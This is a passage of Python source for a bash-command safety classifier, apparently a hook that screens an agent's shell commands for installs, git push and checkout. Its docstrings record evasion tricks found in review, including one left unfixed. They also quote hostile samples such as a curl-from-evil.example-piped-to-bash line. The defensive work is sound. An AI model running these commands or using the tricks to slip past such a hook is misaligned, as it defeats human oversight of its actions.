    j = i + 2
    n = len(tokens)
    while j < n and depth > 0:
        if tokens[j] == "(":
            depth += 1
        elif tokens[j] == ")":
            depth -= 1
        j += 1
    return j


def _find_fused_command_substitution(token: str, search_from: int = 0) -> tuple[int, int] | None:
    """If TOKEN itself contains a self-contained `$(...)` span STARTING AT
    OR AFTER `search_from` -- the shape shlex leaves fused as ONE token
    when the substitution appears inside double quotes (`"prefix $(cmd)
    suffix"` dequotes to one token with the substitution embedded in its
    own text, unlike the unquoted case `_command_substitution_token_span`
    handles, split across multiple tokens by shlex's own punctuation-
    aware splitting) -- return its (start, end) character span within
    TOKEN: `token[start + 2: end - 1]` is the inner command text, `end`
    is the index one past the matching `)`. Returns `None` if TOKEN has
    no `$(` at or after `search_from`, or if what follows is not itself
    closed within this SAME token (the unquoted, cross-token case is
    `_command_substitution_token_span`'s own concern, not this
    function's).

    `search_from` lets a caller find EVERY fused span in a token with
    more than one, not just the first -- found live by Step 8
    independent review, fifteenth round (issue #1326), ported from the
    task-scoped sibling module's own fifteenth-round fix of the same
    finding: a token with TWO fused substitutions (`"$(echo ok)$(pip
    install evil-pkg)"`, one token after shlex's own quote removal) only
    ever had its FIRST span scanned by `_rule_command_substitution_
    content`'s own per-token loop, which called this function once per
    token then moved on -- the second substitution's genuinely dangerous
    content (confirmed live via a real bash proxy that both spans
    execute regardless of quoting) was never recursively classified at
    all."""
    start = token.find("$(", search_from)
    if start == -1:
        return None
    depth = 1
    j = start + 2
    n = len(token)
    while j < n and depth > 0:
        if token[j] == "(":
            depth += 1
        elif token[j] == ")":
            depth -= 1
        j += 1
    if depth != 0:
        return None
    return start, j


def _fold_command_substitution_spans(tokens: list[str]) -> list[str]:
    """Fold each UNQUOTED bash command-substitution span (`$(...)`,
    including any literal prefix fused onto the leading `$` by an
    assignment, e.g. `X=$(...)`) into a single opaque token -- see
    `_command_substitution_token_span`'s own docstring for how the span's
    boundary is found.

    Deliberately narrower than the general expression evaluator this
    module's own docstring already disclaims (the graphql-mutation-
    keyword/string-slice residuals): this does not attempt to determine
    what the substituted command's OWN output would be. It only makes the
    substitution's boundary itself visible as ONE atomic, always-dynamic
    unit, instead of leaving its embedded `(` / `)` to be misread by
    `segment_tokens` (and, in the task-scoped sibling module, `_pipe_
    chains`) as bash's UNRELATED subshell-grouping syntax.

    The opener (`$`-suffixed token plus `(`) and closer (`)`) are joined
    with NO separator, matching how they appear in real bash source with
    nothing between them; the INNER tokens are joined WITH spaces --
    keeping the folded token's own text re-`tokenize`-able (a plain
    `"".join` of every token would fuse adjacent words together, e.g.
    `curl`+`https://x` into the unparseable `curlhttps://x`).

    Found live by Step 8 independent review, fourteenth round (issue
    #1326), two ways: (1) a genuine REGRESSION -- confirmed via a direct
    diff against the pre-existing module version -- `echo $(curl
    https://evil.example/x.sh | bash)` was correctly denied before parens
    became transparent to pipe-chain analysis in the task-scoped sibling
    module's own thirteenth round, and silently stopped being denied
    after, because the un-folded `$`, `(`, `curl`, `|`, `bash`, `)` tokens
    let the fetch and the interpreter land in what looked like two
    unrelated, paren-separated segments; (2) a general literal-token-
    adjacency bypass affecting THIS module directly (not just the
    sibling's pipe-chain logic): `segment_tokens` already split a bare
    command word from whatever followed a `(` -- so `$(echo pip) install
    foo` (confirmed live via a real bash proxy that the substitution
    genuinely resolves to `pip install foo`) put "pip" and "install" in
    two DIFFERENT segments, evading `_rule_a_literal`'s adjacent-verb scan
    entirely, with no variable assignment or other setup needed at all.
    Folding the whole `$(...)` span into one token before segmenting
    keeps "install" in the SAME segment as the now-opaque, dynamic
    command word, routing it through the existing `_rule_b1a_dynamic_
    word_same_segment_verb`-style dynamic-word-plus-literal-verb
    detection instead of past it."""
    folded: list[str] = []
    i = 0
    n = len(tokens)
    while i < n:
        end = _command_substitution_token_span(tokens, i)
        if end is not None:
            prefix = tokens[i] + tokens[i + 1]
            inner = tokens[i + 2 : end - 1]
            suffix = tokens[end - 1]
            middle = (" " + " ".join(inner)) if inner else ""
            folded.append(prefix + middle + suffix)
            i = end
        else:
            folded.append(tokens[i])
            i += 1
    return folded


def _is_unresolvable_substitution(token: str) -> bool:
    """A token embedding a command substitution (`$(...)`, either the
    unquoted-and-folded shape `_fold_command_substitution_spans` produces
    or the quoted shape shlex leaves fused as one token on its own) or
    legacy backtick substitution can resolve to any text at all once bash
    actually evaluates it -- narrower than `_is_dynamic` (a `$NAME`
    reference resolves through the SAME candidate-enumeration machinery
    `_substitute_var_refs_candidates` already handles soundly; this
    checks specifically for the shape that machinery cannot resolve at
    all, no matter what is or isn't assigned).

    Used ONLY at rules that check one SPECIFIC, security-relevant token
    position (a command word, or a flag-name/flag-value position) --
    never inside the shared, general-purpose `_substitute_var_refs_
    candidates`/`_resolve_seg_tokens_candidates` primitives themselves,
    which whole-segment scanners also rely on to resolve EVERY dynamic
    token in a segment. See `_substitute_var_refs_candidates`'s own
    docstring for the false-positive history behind this split."""
    return "$(" in token or "`" in token


def _rule_command_substitution_content(tokens: list[str]) -> tuple[str | None, bool, tuple[str, ...]]:
    """Recursively classify each `$(...)` command-substitution span's OWN
    inner content through this module's full rule set -- bash genuinely
    RUNS that inner text as a complete command the instant the
    substitution is evaluated, regardless of where its output ends up
    being used afterward, so anything that would be denied as a top-level
    command is just as dangerous embedded in a substitution. Naturally
    bounded by the actual paren-nesting depth present in the real input
    -- not an attacker-controlled unbounded search, since the inner
    tokens/text are already directly present in the token stream, never
    inferred or enumerated the way `_substitute_var_refs_candidates`'s
    own bounded candidate expansion is.

    Handles BOTH shapes a `$(...)` span can take: the unquoted, cross-
    token form (`_command_substitution_token_span`, recursed into via
    `_classify_tokens` directly on the inner TOKENS, avoiding a lossy
    token-list-to-string-and-back round trip) and the quoted, single-
    fused-token form (`_find_fused_command_substitution`, recursed into
    via `classify` on the inner TEXT, since that is all this shape
    leaves available).

    Found live by Step 8 independent review, fourteenth round (issue
    #1326): a BARE, unassigned, unquoted `$(...)` occupying the ENTIRE
    command position has its own OUTPUT word-split and re-executed as a
    brand-new command by bash -- `$(echo "uv install foo")` (a
    pre-existing regression test, `command-sub-wrapped-full-text`)
    resolves, real bash, to running `uv install foo`. `_fold_command_
    substitution_spans` alone made the whole span opaque to every rule
    that used to see `echo`/`uv install foo` as two separate, paren-split
    segments (the SAME mechanism `_rule_a_literal`'s own same-token
    literal-phrase fallback already relies on for `echo "pip install
    foo" | cat`); this recursive check restores that coverage by
    classifying the span's own inner content directly, instead of
    requiring the outer, now-opaque token to itself carry the phrase.

    Returns `(reason_or_None, is_git_push, checkout_restore_paths)` --
    ALWAYS a 3-tuple, never a bare `None` -- this module's own `Verdict`
    carries a THIRD, warn-only `is_git_push` field the task-scoped sibling
    module's `Verdict` does not, and `git push` alone is WARN-only here
    (`deny=False, is_git_push=True`), not a hard deny. An earlier version
    of this function only returned `is_git_push` alongside a DENY,
    discarding it whenever the inner substitution's own verdict was
    `deny=False` -- found live by Step 8 independent review, fifteenth
    round (issue #1326): `x=$(git push origin main)` (confirmed live
    end-to-end through the real hook entrypoint) silently dropped the warn
    signal entirely, since folding made `git`/`push`/`origin`/`main` one
    opaque token invisible to `_is_git_push_segment`'s own scan, and the
    recursive check's own early-return-only-on-deny never propagated the
    inner `classify()`/`_classify_tokens()` call's OWN `is_git_push=True`
    result outward. This gated the outward-artifact-preflight provenance
    scan (`hooks/check-bash-safety.sh`'s own downstream consumer of
    `is_git_push`) on a push this classifier itself already knew about
    but silently declined to report. Closed by scanning every span
    unconditionally (not stopping at the first denied one) and OR-ing
    each inner verdict's own `is_git_push` into a running total,
    returned regardless of whether any span was itself denied.

    Issue #1375 threads `checkout_restore_paths` through this exact same
    shape: every span's own inner `checkout_restore_paths` is concatenated
    into a running tuple, unconditionally, so `x=$(git checkout -- f.py)`
    is not silently dropped the same way the fifteenth round's own
    `is_git_push` bug would have dropped it -- the identical bug class,
    for a tuple instead of a bool.

    Disclosed residual (found live by Step 8 independent review,
    nineteenth round, issue #1326): unlike `_rule_array_literal_content`'s
    own nineteenth-round fix, the recursive `_classify_tokens(inner_
    tokens)`/`classify(inner_text)` calls below pass no outer scope, so a
    tool/verb built from a variable assigned OUTSIDE a `$(...)` span's own
    text (e.g. `T=pip; V=install; x=$($T $V foo)`) is still invisible to
    this recursive check, even though it resolves to a real denied
    invocation at bash runtime. Not fixed here: closing it needs the
    string-based `classify()` entry point (used for the quoted/fused
    `$(...)` shape) to also accept an outer scope, a larger change than
    the finding that prompted `_rule_array_literal_content`'s own fix
    warranted."""
    is_git_push = False
    checkout_restore_paths: list[str] = []
    i = 0
    n = len(tokens)
    while i < n:
        search_from = 0
        found_fused = False
        while True:
            fused = _find_fused_command_substitution(tokens[i], search_from)
            if fused is None:
                break
            found_fused = True
            start, end = fused
            inner_text = tokens[i][start + 2 : end - 1]
            # Deliberately plain `.strip()`, NOT `.strip(_BASH_DEFAULT_IFS)`
            # -- considered during Step 8 independent review, twenty-
            # seventh round (issue #1326), and left as-is: this asks a
            # DIFFERENT question than `_token_is_all_unassigned_refs`'s own
            # IFS-based word-splitting check (whether a REFERENCE vanishes
            # at runtime) -- here it is "is there any source text worth
            # recursively classifying at all," a shell-lexing/optimization
            # question, not a runtime-value-vanishing one. Any non-empty
            # residue (`\r`, `\v`, etc. included) is inert as an actual
            # command by itself either way, so narrowing this particular
            # check would only change how often an empty-content recursive
            # `classify()` call is skipped, never a real verdict.
            if inner_text.strip():
                inner_verdict = classify(inner_text)
                is_git_push = is_git_push or inner_verdict.is_git_push
                checkout_restore_paths.extend(inner_verdict.checkout_restore_paths)
                if inner_verdict.deny:
                    reason = f"a command substitution $(...) embeds a denied command -- {inner_verdict.reason}"
                    return reason, is_git_push, tuple(checkout_restore_paths)
            search_from = end
        if found_fused:
            i += 1
            continue
        span_end = _command_substitution_token_span(tokens, i)
        if span_end is not None:
            inner_tokens = tokens[i + 2 : span_end - 1]
            if inner_tokens:
                inner_verdict = _classify_tokens(inner_tokens)
                is_git_push = is_git_push or inner_verdict.is_git_push
                checkout_restore_paths.extend(inner_verdict.checkout_restore_paths)
                if inner_verdict.deny:
                    reason = f"a command substitution $(...) embeds a denied command -- {inner_verdict.reason}"
                    return reason, is_git_push, tuple(checkout_restore_paths)
            i = span_end
            continue
        i += 1
    return None, is_git_push, tuple(checkout_restore_paths)


_COMMENT_BOUNDARY_CHARS = frozenset(" \t\r\n;|&()<>")


def _strip_comments(command: str) -> str:
    """Delete every bash `#`-comment span from COMMAND -- from an unescaped,
    unquoted `#` sitting at a bash WORD-BOUNDARY position, up to (but NOT
    including) the next raw newline, or the end of COMMAND if there is no
    further newline. Must run BEFORE `_strip_line_continuations` (and
    before shlex, which is also never told about `#` at all -- see
    `tokenize()`'s own docstring) on the fully raw command text, so a
    comment's own content can never interact with continuation-stripping
    or be exposed to shlex's own literal-token scan at all.

    Found live by issue #1350, during independent adversarial review of
    this same issue's own newline fix: Python's `shlex` (posix mode)
    defaults `commenters` to `'#'`, a setting this module never touched --
    an unquoted `#` at a word boundary makes shlex consume everything up
    to and INCLUDING the next newline as an inert comment, silently
    discarding that newline along with the comment text. This reopens the
    exact bug class issue #1350 exists to close, just triggered by `#`
    instead of a bare newline: confirmed live that `VERB=install; echo hi
    #x` + a real newline + `pip $VERB foo` (two real bash statements,
    confirmed live via a real bash proxy that the second one genuinely
    reaches `pip install foo`) tokenized with NO trace of the separating
    newline at all before this fix, collapsing both statements into one
    flat segment and returning `deny=False` in both classifier modules --
    identical in shape to this issue's own original finding, just routed
    through `#` rather than a silently-absorbed bare newline.

    WORD-BOUNDARY position (an unquoted `#` is a comment-starter only
    here, matching real bash's own grammar, confirmed live for every case
    below rather than assumed): the very start of COMMAND, or immediately
    after whitespace (` \\t\\r\\n`) or a control-operator character (`;|&()<>`,
    `_COMMENT_BOUNDARY_CHARS` above -- POSIX's own full control-operator
    character set, so a comment right after `;`/`|` with no intervening
    space is recognized exactly like real bash: `dump a;#comment` + a real
    newline + `dump b` real-runs as two separate statements, and `dump a |
    dump b #comment` real-runs `dump b` with the comment stripped, its
    output unaffected). A `#` FUSED onto a preceding non-boundary
    character is NOT a comment (`foo#bar baz` real-runs as one word
    `foo#bar` plus `baz`, confirmed live) -- also confirmed live for the
    ESCAPED case (`\\#notacomment` real-runs as one literal word
    `#notacomment`, the backslash consumed and the `#` never treated as a
    comment-starter at all).

    Never recognizes `#` as a comment-starter inside an open single OR
    double quote (`"a#b"` and `'a#b'` both real-run as one literal word
    `a#b`, confirmed live) -- quote state is tracked here independently of
    `_strip_line_continuations`'s own (single-quote-only) tracking, since
    THIS function additionally needs double-quote awareness `_strip_line_
    continuations` does not (`#` is literal inside double quotes too,
    unlike backslash-newline continuation, which real bash still honors
    there). A backslash is always consumed together with whatever
    character immediately follows it (inside or outside a double quote),
    for the same reason `_strip_line_continuations` does this for
    continuation pairs -- so an escaped quote character never wrongly
    toggles this function's own quote-tracking state, and an escaped `#`
    is correctly read as ordinary word content, never a boundary.

    Deliberately does NOT treat a trailing backslash at the very end of a
    comment's own text as a continuation into the next physical line --
    confirmed live that bash's own comment grammar gives backslash NO
    special meaning once a comment has started (`dump c #comment ends
    here \\` + a real newline + `dump d` real-runs as two separate
    statements, `dump c` and `dump d`, the comment's own trailing
    backslash inert) -- a comment always ends at the very next raw
    newline in COMMAND, full stop, which is exactly what searching for the
    next raw `\\n` (rather than delegating to `_strip_line_continuations`
    first) gives here.

    A genuine line continuation (`\\` immediately followed by a raw
    newline) is the ONE backslash-pair shape that does NOT clear
    AT_BOUNDARY -- CRITICAL bug found by independent adversarial review
    (round 6, issue #1375, during this PR's own merge with issue #1350's
    already-merged `_strip_comments`): a continuation vanishes with
    NOTHING left behind once `_strip_line_continuations` runs afterward
    (this function only passes the pair through unchanged; it does not
    itself delete it), so the boundary status right after a continuation
    must be whatever it was right BEFORE the backslash, exactly as if the
    continuation were not there at all -- every OTHER escaped pair (an
    escaped literal character that genuinely survives into the output,
    like `\\#`) correctly still clears it, since that character is real,
    non-boundary word content. Confirmed live this was a real, security-
    relevant leak once combined with issue #1375's own checkout/restore
    feature: `git checkout -- clean.py \\` + newline + `# TODO revisit
    auth.py later` used to tokenize with `#` never recognized as a
    comment-starter (AT_BOUNDARY wrongly cleared by the continuation
    pair), sweeping `auth.py` (an unrelated filename that merely happens
    to appear in the comment text) into `checkout_restore_paths` as a
    phantom candidate, and denying an entirely safe checkout with a
    misleading message naming a file the command never referenced. Only
    an over-denial (never a missed real discard), but a confusing one.

    A double-quoted string's own content delegates to `_consume_double_
    quoted_content` rather than being handled inline -- CRITICAL, full-
    classifier-bypass bug found by independent adversarial review (round
    7, issue #1375): the PRIOR inline double-quote handling treated
    everything inside an open double quote as opaque literal text with
    NO comment recognition at all, correct for genuine literal content
    (`"a#b"` really is one literal word in real bash) but WRONG for a
    `$(...)` embedded inside that double-quoted string -- real bash
    recursively re-enters full, ordinary command grammar for a
    substitution's own content regardless of what quote encloses the
    `$(` that opened it, so a `#` inside it DOES start a real comment
    (confirmed live: a `)` inside a `#`-comment inside `"$(...)"` does
    NOT end the substitution). Left unstripped, that comment's own
    embedded `)` survived into shlex's dequoted token, where
    `_find_fused_command_substitution`'s own paren-depth counter (see
    that function's own docstring) -- comment- and quote-blind by
    design -- mistook it for the substitution's REAL closing paren,
    silently truncating everything after that point, INCLUDING a
    genuine, undisguised `git checkout` on the next physical line, from
    ALL classification, not merely this module's own checkout/restore
    rule. Live-verified real, silent data loss: `x="$(echo hi #comment
    with paren ) here` + a real newline + `git checkout -- dirty.py)"`
    ran the embedded checkout for real and discarded an uncommitted
    change, while `classify()` reported `deny=False` with an EMPTY
    `checkout_restore_paths` -- a confident, wrong "nothing to see here"
    instead of an honest non-goal, precisely the failure class this
    whole module exists to avoid. The analogous decoy built from a
    literal `)` inside a nested QUOTED span (rather than a comment) does
    NOT need this fix and was checked live: any balanced quoted span
    containing a literal `)` necessarily leaves an ODD, unbalanced quote
    count in text naively truncated partway through it, which already
    trips `tokenize()`'s own `TokenizeError` fail-closed path -- only a
    comment can hide an unbalanced `)` without requiring an unbalanced
    quote in the truncated prefix, which is why this fix is scoped to
    comment-handling specifically rather than a general rewrite of the
    paren-depth counter itself."""
    out: list[str] = []
    in_single_quote = False
    at_boundary = True
    i = 0
    n = len(command)
    while i < n:
        char = command[i]
        if in_single_quote:
            out.append(char)
            if char == "'":
                in_single_quote = False
                at_boundary = False
            i += 1
            continue
        if char == '"':
            out.append(char)
            i += 1
            inner, i = _consume_double_quoted_content(command, i)
            out.append(inner)
            at_boundary = False
            continue
        if char == "\\" and i + 1 < n:
            nxt = command[i + 1]
            out.append(char)
            out.append(nxt)
            i += 2
            if nxt != "\n":
                at_boundary = False
            continue
        if char == "'":
            in_single_quote = True
            out.append(char)
            i += 1
            at_boundary = False
            continue
        if char == "#" and at_boundary:
            end = command.find("\n", i)
            i = n if end == -1 else end
            continue
        out.append(char)
        at_boundary = char in _COMMENT_BOUNDARY_CHARS
        i += 1
    return "".join(out)


def _consume_double_quoted_content(command: str, i: int) -> tuple[str, int]:
    """Process the content of a double-quoted string starting at
    COMMAND[i] (the character right after the opening `"`, already
    appended by the caller): everything is literal EXCEPT a nested
    `$(...)`, which re-enters ordinary, comment-aware command parsing
    via `_consume_command_substitution_content` -- see that function's
    own docstring, and `_strip_comments`'s own round-7 addendum, for the
    live-verified bypass this closes. Returns (the content up to and
    including its own matching `"`, or the remainder of COMMAND if
    unterminated -- an unbalanced double quote is `tokenize()`'s own
    concern to fail closed on via `TokenizeError`, not this function's,
    which only strips comments and never itself validates quote
    balance -- the index one past that point)."""
    out: list[str] = []
    n = len(command)
    while i < n:
        char = command[i]
        if char == '"':
            out.append(char)
            i += 1
            return "".join(out), i
        if char == "\\" and i + 1 < n:
            out.append(char)
            out.append(command[i + 1])
            i += 2
            continue
        if char == "$" and i + 1 < n and command[i + 1] == "(":
            out.append("$(")
            i += 2
            inner, i = _consume_command_substitution_content(command, i)
            out.append(inner)
            continue
        out.append(char)
        i += 1
    return "".join(out), i


def _consume_command_substitution_content(command: str, i: int) -> tuple[str, int]:
    """Process the content of a `$(...)` starting at COMMAND[i] (the
    character right after the opening `$(`, already appended by the
    caller), mirroring real bash's own re-entrant grammar: a command
    substitution's own content is parsed as ordinary, top-level shell
    text regardless of what quote (if any) encloses the `$(` that opened
    it -- comments are live again, and a nested `'`/`"`/`$(` inside gets
    its own, independent handling (a nested `"..."` delegates back to
    `_consume_double_quoted_content`, which can itself contain a FURTHER
    nested `$(...)`, exactly mirroring bash's own mutual recursion
    between quote parsing and command parsing). Tracks its own raw,
    unquoted paren DEPTH (starting at 1, for the substitution this call
    itself is inside) to find its own matching closing `)` -- a nested
    unquoted `(`/`)` (a subshell, or arithmetic-looking text this module
    does not otherwise interpret) increments/decrements it exactly like
    `_find_fused_command_substitution`'s own counter does, but unlike
    that counter, a `(`/`)` sitting inside a quote or a stripped comment
    here is correctly never counted at all, since this function consumes
    those spans as opaque units before ever inspecting their content for
    a bare paren. Returns (the content up to and including its own
    matching `)`, with every comment inside it deleted, the index one
    past that `)`) -- or, if COMMAND ends before depth returns to 0, the
    remainder of COMMAND with whatever comments were found still
    stripped (an unbalanced `$(...)` is `tokenize()`'s own concern to
    fail closed on via `TokenizeError`, not this function's).

    See `_strip_comments`'s own round-7 docstring addendum (issue #1375)
    for the live-verified, real-data-loss bypass this function exists to
    close, and for why the analogous decoy built from a quoted (rather
    than commented) literal `)` needs no fix here."""
    out: list[str] = []
    at_boundary = True
    depth = 1
    n = len(command)
    while i < n:
        char = command[i]
        if char == "'":
            out.append(char)
            i += 1
            while i < n and command[i] != "'":
                out.append(command[i])
                i += 1
            if i < n:
                out.append(command[i])
                i += 1
            at_boundary = False
            continue
        if char == '"':
            out.append(char)
            i += 1
            inner, i = _consume_double_quoted_content(command, i)
            out.append(inner)
            at_boundary = False
            continue
        if char == "\\" and i + 1 < n:
            nxt = command[i + 1]
            out.append(char)
            out.append(nxt)
            i += 2
            if nxt != "\n":
                at_boundary = False
            continue
        if char == "$" and i + 1 < n and command[i + 1] == "(":
            out.append("$(")
            i += 2
            inner, i = _consume_command_substitution_content(command, i)
            out.append(inner)
            at_boundary = False
            continue
        if char == "(":
            depth += 1
            out.append(char)
            at_boundary = False
            i += 1
            continue
        if char == ")":
            depth -= 1
            out.append(char)
            i += 1
            if depth == 0:
                return "".join(out), i
            at_boundary = False
            continue
        if char == "#" and at_boundary:
            end = command.find("\n", i)
            i = n if end == -1 else end
            continue
        out.append(char)
        at_boundary = char in _COMMENT_BOUNDARY_CHARS
        i += 1
    return "".join(out), i


def _strip_line_continuations(command: str) -> str:
    """Delete every bash line-continuation pair (an unescaped `\\` directly
    followed by a real newline) from COMMAND, outside single-quoted spans --
    a raw, character-level preprocessing pass that must run BEFORE shlex
    ever sees the text, mirroring bash's own lexical join of the two
    physical source lines into one logical line with NOTHING inserted in
    the continuation's place (not even a space).

    Found live independently, TWICE, by two different issues investigating
    two different bugs: issue #1375's own round-3 checkout/restore review
    (an everyday `git checkout -- \\` + newline + `file.py` line-wrap
    tokenized to a path with a literal leading newline baked in, silently
    bypassing that feature's whole guard) and issue #1350 (filed separately
    from #1326, a materially different bypass shape -- segment-boundary
    loss, not verb-token-splitting -- found while verifying #1350's own
    newline-as-statement-separator fix against the identical backslash-
    newline continuation case). Both confirm the same root cause: Python's
    `shlex` (posix mode) treats a backslash as a generic single-character
    escape -- `\\<newline>` keeps the escaped newline CHARACTER verbatim in
    the token (`tokenize("echo a \\\\\\nb")` produced `['echo', 'a',
    '\\nb']` before this fix) -- but real bash's own line-continuation rule
    instead DELETES both the backslash and the newline entirely, with no
    character left behind (confirmed live via a real bash proxy: `dump() {
    for a in "$@"; do printf '[%s]\\n' "$a"; done; }` then `dump echo a \\`
    + a real newline + `b` prints `[echo][a][b]`, three plain args, never a
    fused `\\nb`). Reconciled into one shared implementation and docstring
    during this PR's own merge with #1350's already-merged fix, rather than
    keeping two independently-written copies of the identical function.

    Single quotes are the ONE bash quoting context where backslash has NO
    special meaning at all (confirmed live: `dump 'a \\` + a real newline +
    `b'` prints the backslash and the newline both preserved literally,
    `[a \\` + newline + `b]`). Continuation removal is applied uniformly to
    every OTHER context -- both fully unquoted AND double-quoted alike --
    confirmed live that both shapes delete the pair identically (`dump "a
    \\` + newline + `b"` also prints `[a b]`).

    Tracks BOTH single-quote AND double-quote state (not single-quote
    alone): an in-progress issue #1350 draft of this same function tracked
    only a single-quote toggle, on the reasoning that continuation-removal
    itself behaves identically whether unquoted or double-quoted -- true,
    but that draft used the SAME undifferentiated "not single-quoted" state
    to also decide when a literal `'` character should OPEN a new single-
    quoted region, which is wrong the moment that `'` sits INSIDE an
    already-open double-quoted string (bash gives an apostrophe zero
    special meaning there, confirmed live: `printf '[%s]' "don't strip \\`
    + a real newline + `this"` prints `[don't strip this]`, one continuous
    argument with the continuation removed) -- the undifferentiated draft
    would misread that inner apostrophe as a real quote-opener, wrongly
    stop removing continuations from that point on, and then hunt for a
    non-existent SECOND apostrophe to "close" it, potentially miscounting
    quote state for the rest of the command. An ordinary contraction inside
    a line-continued double-quoted string (a commit-message-shaped string
    literal, for instance) is exactly the honest-accident-shaped case this
    whole preprocessing pass exists to get right, so this divergence was
    caught and fixed here rather than carried forward. Found and fixed
    during this same merge-conflict reconciliation, verified against the
    live case above.

    A backslash is consumed together with whatever character immediately
    follows it (newline or not) so an already-escaped backslash can never
    be mistaken for a fresh, "available" one two positions later -- real
    bash's own even/odd backslash-run parity rule before a newline,
    confirmed live across three cases: an EVEN run of backslashes directly
    before a newline is NOT a continuation (`dump a\\\\\\\\` + newline +
    `b` -- 4 backslashes -- prints `[a\\\\]` then a SEPARATE, failing `b`
    command, i.e. the newline stayed a real separator), while an ODD run
    IS (`dump a\\\\\\` + newline + `b` -- 3 backslashes -- prints the
    single fused arg `[a\\b]`, one literal backslash between `a` and `b`,
    the final backslash's own newline deleted). This function does not
    itself collapse a surviving escaped-backslash pair into one literal
    backslash character -- it only decides which raw newline bytes to
    delete before shlex ever runs; shlex's own existing, unmodified escape
    handling still performs that collapse exactly as it already did."""
    out: list[str] = []
    in_single_quote = False
    in_double_quote = False
    i = 0
    n = len(command)
    while i < n:
        char = command[i]
        if in_single_quote:
            out.append(char)
            if char == "'":
                in_single_quote = False
            i += 1
            continue
        if char == "\\" and i + 1 < n:
            nxt = command[i + 1]
            if nxt == "\n":
                i += 2
                continue
            out.append(char)
            out.append(nxt)
            i += 2
            continue
        if in_double_quote:
            if char == '"':
                in_double_quote = False
            out.append(char)
            i += 1
            continue
        if char == "'":
            in_single_quote = True
            out.append(char)
            i += 1
            continue
        if char == '"':
            in_double_quote = True
            out.append(char)
            i += 1
            continue
        out.append(char)
        i += 1
    return "".join(out)


def tokenize(command: str) -> list[str]:
    """Raises TokenizeError on anything shlex cannot parse (e.g. an
    unbalanced quote) -- the caller must fail closed on that, the same
    fail-closed discipline this hook's malformed-JSON guards already
    apply one layer up. Deliberately does NOT fold command-substitution
    spans here -- `_classify_tokens` applies `_fold_command_substitution_
    spans` itself, AFTER first running `_rule_command_substitution_
    content` against these still-unfolded tokens, which needs each
    span's own inner tokens still separable.

    Also independently found live by adversarial review of issue #1375's
    own new checkout/restore detection, the identical newline-swallowing
    bug below described from issue #1350's own side: unlike every prior
    rule in this module (none of which depend on a segment actually ending
    where a real multi-line script's own line breaks fall),
    `_git_checkout_paths`/`_git_restore_paths` consume every token up to
    the (wrongly unbroken) end of the segment as candidate path data --
    confirmed live that `git checkout -b newbranch master\\necho
    "exit=$?"` (an ordinary two-line script, checkout on the first line,
    something unrelated on the second) had the second line's own
    `exit=$?` swept in as a checkout path candidate and spuriously denied
    the whole command as an unresolvable dynamic path, purely because the
    newline between the two lines was never recognized as a boundary --
    and, separately, that an ordinary line-continued `git checkout --
    \\` + newline + `file.py` tokenized to a path with a literal leading
    newline baked in, silently bypassing that feature's own guard (closed
    by `_strip_line_continuations` below). Reconciled into this one
    shared fix during this PR's own merge with issue #1350's
    already-merged fix for the same underlying gap, rather than landing a
    second, independent implementation.

    Found live by issue #1350: `segment_tokens`'s own `_SINGLE_OPS` set
    was deliberately written to include a literal `"\\n"`, showing clear
    intent to treat a newline as a real bash statement separator exactly
    like `;` -- but this function's own shlex configuration never actually
    produced one. shlex's DEFAULT `whitespace` attribute (`' \\t\\r\\n'`)
    absorbs a bare, unquoted newline as ordinary inter-word whitespace, the
    same as a plain space, so it was silently discarded before ever
    reaching `_split_punct_run`/`segment_tokens` -- confirmed live
    (`shlex.shlex("echo hi\\nFAKETOOL sub cmd 1", posix=True,
    punctuation_chars=True)` with `whitespace_split = True` yields
    `['echo', 'hi', 'FAKETOOL', 'sub', 'cmd', '1']`, one flat run with no
    trace of the newline at all) and, live against this module's own
    `classify()`, that a two-real-bash-statement newline-joined command
    (the second one alone denied) collapsed into ONE segment here, letting
    a `seg[0]`-anchored rule in the task-scoped sibling module (this
    module's own literal-adjacency scan happened to still catch the
    specific case that surfaced the bug) miss the second statement's own
    denied verb entirely, since it never sat at `seg[0]` of its own
    segment.

    Closed two ways together, since fixing one alone would have left the
    other as either a live gap or a newly wrong tokenization (see each
    helper's own docstring for the live verification backing it): (1)
    `_strip_line_continuations` above removes every genuine bash line-
    continuation (`\\<newline>`) from the raw source FIRST, so a
    continued logical line never reaches shlex carrying a real newline
    character at all; (2) the lexer below is constructed with an explicit
    `punctuation_chars` string (shlex's own default `'();<>|&'` plus a
    literal `\\n`) instead of the `True` shortcut, and has `\\n` removed
    from its own `whitespace` attribute -- turning every REMAINING raw
    newline (by construction, now only a genuine statement separator, or a
    literal newline already safely enclosed in an open quote) into its own
    recognized operator token, exactly like `;`, `|`, or `&` already are,
    rather than silently-absorbed whitespace. Confirmed live that a quoted
    embedded newline (`echo "a\\nb"`, a literal multi-line string argument
    with no backslash at all) is unaffected -- shlex's own quote-parsing
    state machine consumes it as ordinary literal content of the open
    quote before `punctuation_chars` membership is ever consulted, the
    same way it already did for any other operator character appearing
    inside a quote.

    Found live during independent adversarial review of this same fix
    (issue #1350): shlex's own DEFAULT `commenters` attribute (`'#'`,
    never touched by this module before now) reopens the identical bug
    class via a different route -- an unquoted `#` at a word boundary
    makes shlex consume everything up to and INCLUDING the next newline
    as an inert comment, silently discarding that newline right along
    with the comment text, exactly the same collapse this fix's own
    newline-as-token change exists to prevent. Closed by `_strip_
    comments` above, run FIRST (before `_strip_line_continuations`, on
    the still-fully-raw command text, so a comment's own content can
    never interact with continuation-stripping or reach shlex at all) --
    see that function's own docstring for the full live-verified word-
    boundary/quoting/escaping rules it implements. `lexer.commenters` is
    then explicitly cleared below (rather than left at its default) so
    shlex never independently re-derives comment boundaries through its
    own, separately-verified-only-by-upstream logic -- comment semantics
    are owned exclusively by `_strip_comments` from here on."""
    command = _strip_comments(command)
    command = _strip_line_continuations(command)
    try:
        lexer = shlex.shlex(command, posix=True, punctuation_chars="();<>|&\n")
        lexer.commenters = ""
        lexer.whitespace_split = True
        lexer.whitespace = lexer.whitespace.replace("\n", "")
        raw_tokens = list(lexer)
    except ValueError as error:
        raise TokenizeError(str(error)) from error

    tokens: list[str] = []
    for raw in raw_tokens:
        for piece in _split_punct_run(raw):
            tokens.extend(_ifs_split(piece))
    return tokens


def segment_tokens(tokens: list[str]) -> list[list[str]]:
    """Split the flat token stream into simple-command segments at shell
    control-operator boundaries (; | & && || ( ) newline)."""
    segments: list[list[str]] = [[]]
    for token in tokens:
        if token in _SINGLE_OPS or token in _MULTI_OPS:
            segments.append([])
        else:
            segments[-1].append(token)
    return [seg for seg in segments if seg]


def _assigned_literals(tokens: list[str]) -> dict[str, str]:
    """Map each NAME=value assignment token's variable name to its
